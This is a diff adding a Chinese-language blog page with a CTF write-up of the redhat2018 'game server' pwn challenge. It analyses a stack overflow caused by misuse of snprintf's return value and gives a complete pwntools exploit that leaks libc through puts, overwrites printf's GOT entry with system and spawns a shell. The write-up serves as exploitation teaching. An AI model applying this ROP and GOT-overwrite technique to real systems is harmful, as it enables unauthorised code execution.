@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Sp4n9x" />
+<meta name="renderer" content="webkit">
+<meta name="google" value="notranslate">
+
+
+
+<meta name="description" content="刷题刷题，考试暂告一段落。这篇博客主要记录redhat2018中的pwn题和reverse题的分析过程。reverse还没有训练，后期再补。">
+<meta name="keywords" content="CTF,Pwn,Stack Overflow,Got表覆写">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redhat2018—writeup">
+<meta property="og:url" content="http://sp4n9x.github.io/2018/05/27/redhat2018—writeup/index.html">
+<meta property="og:site_name" content="Sp4n9x&#39;s Blog">
+<meta property="og:description" content="刷题刷题，考试暂告一段落。这篇博客主要记录redhat2018中的pwn题和reverse题的分析过程。reverse还没有训练，后期再补。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-11-14T16:06:31.277Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="redhat2018—writeup">
+<meta name="twitter:description" content="刷题刷题，考试暂告一段落。这篇博客主要记录redhat2018中的pwn题和reverse题的分析过程。reverse还没有训练，后期再补。">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternative" href="/atom.xml" title="Sp4n9x&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>redhat2018—writeup | Sp4n9x&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?48aad015dbbeb363812643fd03e528c5";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Sp4n9x</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">留言板</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:sp4n9x@qq.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/Sp4n9x" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
+                            
+                                <a class="fa 网易云音乐" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
+                            
+                            <!--
+                            <div id="music163player">
+                                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=250 height=86 src="//music.163.com/outchain/player?type=2&id=535693399&auto=1&height=66">
+                                </iframe>
+                            </div>
+                            -->
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Adobe-Reader/">Adobe Reader</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS隐蔽信道通信/">DNS隐蔽信道通信</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Got表覆写/">Got表覆写</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Microsoft-Office/">Microsoft Office</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pdf/">Pdf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rtf/">Rtf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="//moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">Sp4n9x&#39;s 简介</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Sp4n9x</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Sp4n9x</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">留言板</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:sp4n9x@qq.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Sp4n9x" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
+                            
+                                <a class="fa 网易云音乐" target="_blank" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-redhat2018—writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/05/27/redhat2018—writeup/" class="article-date">
+      <time datetime="2018-05-26T16:00:00.000Z" itemprop="datePublished">2018-05-27</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      redhat2018—writeup
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Got表覆写/">Got表覆写</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+          
+        <blockquote>
+<p>刷题刷题，考试暂告一段落。这篇博客主要记录redhat2018中的pwn题和reverse题的分析过程。reverse还没有训练，后期再补。<br><a id="more"></a></p>
+</blockquote>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="game-server"><a href="#game-server" class="headerlink" title="game server"></a>game server</h3><h4 id="0x00-file-amp-checksec"><a href="#0x00-file-amp-checksec" class="headerlink" title="0x00 file&amp;checksec"></a>0x00 file&amp;checksec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file game_server</span><br><span class="line">game_server: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=f2edc9b459a64a0a5d698157da465036f722679e, stripped</span><br><span class="line">$ checksec game_server</span><br><span class="line">[*] <span class="string">'/home/.../pwn/redhat2018/game_server/game_server'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>通过<code>file</code>命令可以看到这是一个<code>32bit</code>的ELF，<code>动态链接</code>，并且<code>去除了符号表</code>。通过<code>checksec</code>命令可以看到程序开启了<code>NX</code>，所以一般需要用到<code>ret2libc</code>.</p>
+<h4 id="0x01-IDA分析程序逻辑"><a href="#0x01-IDA分析程序逻辑" class="headerlink" title="0x01 IDA分析程序逻辑"></a>0x01 IDA分析程序逻辑</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  sub_8048637();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now you can start you game in middle earth"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到主函数里面只有一个自定义函数，逻辑一定在这里面了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048637</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+7h] [bp-111h]@5</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [sp+107h] [bp-11h]@5</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [sp+108h] [bp-10h]@5</span></span><br><span class="line">  <span class="keyword">char</span> *len; <span class="comment">// [sp+10Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to my game server"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"First, you need to tell me you name?"</span>);</span><br><span class="line">  fgets(name_buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  len = <span class="built_in">strrchr</span>(name_buf, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">    *len = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, name_buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's you occupation?"</span>);</span><br><span class="line">  fgets(occupation_buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  len = <span class="built_in">strrchr</span>(occupation_buf, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">    *len = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Well, my noble %s\n"</span>, occupation_buf);</span><br><span class="line">  nbytes = <span class="built_in">snprintf</span>(</span><br><span class="line">             &amp;s,</span><br><span class="line">             <span class="number">256u</span>,</span><br><span class="line">             <span class="string">"Our %s is a noble %s. He is come from north and well change out would."</span>,</span><br><span class="line">             name_buf,</span><br><span class="line">             occupation_buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Here is you introduce"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to edit you introduce by yourself?[Y/N]"</span>);</span><br><span class="line">  v2 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">'Y'</span> )                              <span class="comment">// Y</span></span><br><span class="line">    read(<span class="number">0</span>, &amp;s, nbytes);                        <span class="comment">// 存在溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"name : %s\noccupation : %s\nintroduce : %s\n"</span>, name_buf, occupation_buf, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以看到，首先需要我们输入<code>name</code>和<code>occupation</code>信息，再往后看，可以看到<code>snprintf()</code>函数,这是一个需要注意的点。先来看一下snprintf()函数的原型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">****************************<span class="built_in">snprintf</span>()原型*******************************</span><br><span class="line"><span class="number">1.</span> *str 这是存放结果字符串的字符数组指针</span><br><span class="line"><span class="number">2.</span> size （<span class="number">1</span>）如果格式化后的字符串长度 &lt; size，则将此字符串全部复制到str中，并给</span><br><span class="line">        其后添加一个字符串结束符(<span class="string">'\0'</span>)；</span><br><span class="line">        （<span class="number">2</span>）如果格式化后的字符串长度 &gt;= size，则只将其中的(size<span class="number">-1</span>)个字符复制到</span><br><span class="line">        str中，并给其后添加一个字符串结束符(<span class="string">'\0'</span>)，返回值为欲写入的字符串长度。</span><br><span class="line"><span class="number">3.</span> *format 格式化字符串</span><br><span class="line"><span class="number">4.</span> ... 参数的个数是不确定的</span><br><span class="line"><span class="number">5.</span> 返回值 若成功则返回预写入的字符串长度，若出错则返回负值。</span><br><span class="line"><span class="number">6.</span> 头文件 #include &lt;stdio.h&gt;</span><br><span class="line">*************************************************************************</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">snprintf</span>(<span class="keyword">char</span> *str, <span class="keyword">size_t</span> size, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span><br></pre></td></tr></table></figure>
+<p>可以看到，此程序是将输入的<code>name</code>和<code>occupation</code>复制到字符数组<code>s</code>中，但是返回值<code>nbytes</code>得到的是实际输入的两个字符串长度和格式化字符串之和。后面又用到了<code>read()</code>函数，显然在这里存在<code>栈溢出</code>，可以控制程序运行流程。还可以看到<code>s</code>数组的起始地址是<code>bp-111h</code>,所以输入<code>(bp-111h)+4</code>个字节数据就可以覆盖到返回地址。这里我们用<code>puts()</code>函数泄露出<code>puts()</code>的真实地址，通过计算偏移，算出<code>system</code>的地址。<code>/bin/sh</code>的地址可以用<code>read()</code>读入<code>bss段</code>，也可以直接利用<code>libc</code>中的。我这里使用的是将<code>system</code>地址覆盖到<code>printf</code>的<code>Got表</code>，并用<code>read()</code>将<code>/bin/sh</code>读入<code>bss段</code>。显然有些麻烦，直接转到算出的system地址和/bin/sh地址比较方便，代码也少。</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#GOT table cover</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    Io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10000</span>)</span><br><span class="line">    libc = ELF(<span class="string">'libc6-i386_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Io = process(<span class="string">'./game_server'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'libc6_2.23-0ubuntu10_i386.so'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./game_server'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_plt = "</span> + hex(puts_plt)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_got = "</span> + hex(puts_got)</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"read_plt = "</span> + hex(read_plt)</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got = "</span> + hex(printf_got)</span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_plt = "</span> + hex(printf_plt)</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bss_base = "</span> + hex(bss_base)</span><br><span class="line"></span><br><span class="line">p_ebp_ret = <span class="number">0x0804881b</span><span class="comment"># : pop ebp ; ret</span></span><br><span class="line">ppp_ret = <span class="number">0x08048819</span><span class="comment"># : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">ret = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_offset = "</span> + hex(puts_offset)</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_offset = "</span> + hex(system_offset)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0xfc</span></span><br><span class="line">Io.recvuntil(<span class="string">'First, you need to tell me you name?\n'</span>)</span><br><span class="line">Io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'b'</span>*<span class="number">0xfc</span></span><br><span class="line">Io.recvuntil(<span class="string">'What\'s you occupation?\n'</span>)</span><br><span class="line">Io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'Y'</span></span><br><span class="line">Io.recvuntil(<span class="string">'Do you want to edit you introduce by yourself?[Y/N]\n'</span>)</span><br><span class="line">Io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">'a'</span>*<span class="number">0x111</span> + <span class="string">'b'</span>*<span class="number">4</span></span><br><span class="line">payload4 += p32(puts_plt) + p32(p_ebp_ret) + p32(puts_got)</span><br><span class="line">payload4 += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(printf_got) + p32(<span class="number">4</span>)</span><br><span class="line">payload4 += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(bss_base) + p32(<span class="number">8</span>)</span><br><span class="line">payload4 += p32(printf_plt) + p32(ret) + p32(bss_base)</span><br><span class="line"></span><br><span class="line">Io.sendline(payload4)</span><br><span class="line">Io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">Io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">Io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(Io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr = "</span> + hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span> + hex(libc_base)</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr = "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">Io.send(p32(system_addr))</span><br><span class="line">Io.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">Io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/05/27/redhat2018—writeup/">redhat2018—writeup</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Sp4n9x 的个人博客">Sp4n9x</a></p>
+        <p><span>发布时间:</span>2018-05-27, 00:00</p>
+        <p><span>最后更新:</span>2018-11-15, 00:06</p>
+        
+            <p>
+                <span>更新历史:</span><i class="fa fa-github"></i>
+                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-05-27.redhat2018—writeup.md" title="顺序查看文章各部分修改记录" target = "_blank">Blame</a>,
+                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-05-27.redhat2018—writeup.md" title="查看文章有关更新记录" target = "_blank">History</a><span class="raw">文本模式:</span><i class="fa fa-file-text-o"></i>
+                <a href="https://raw.githubusercontent.com/Sp4n9x/blog_backup/blob/master/_posts/2018-05-27.redhat2018—writeup.md" title="查看 & 下载文章 Markdown 原始文本" target = "_blank"> .md Raw</a>
+            </p>
+        
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/05/27/redhat2018—writeup/" title="redhat2018—writeup">http://sp4n9x.github.io/2018/05/27/redhat2018—writeup/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://sp4n9x.github.io/2018/05/27/redhat2018—writeup/　　作者: Sp4n9x" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+    
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2018/06/01/CVE-2010-2883复现与分析/">
+                    CVE-2010-2883复现与分析
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/05/11/一步一步学ROP之Linux_x64篇-蒸米/">
+                    一步一步学ROP之Linux_x64篇-蒸米
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+
+
+
+
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
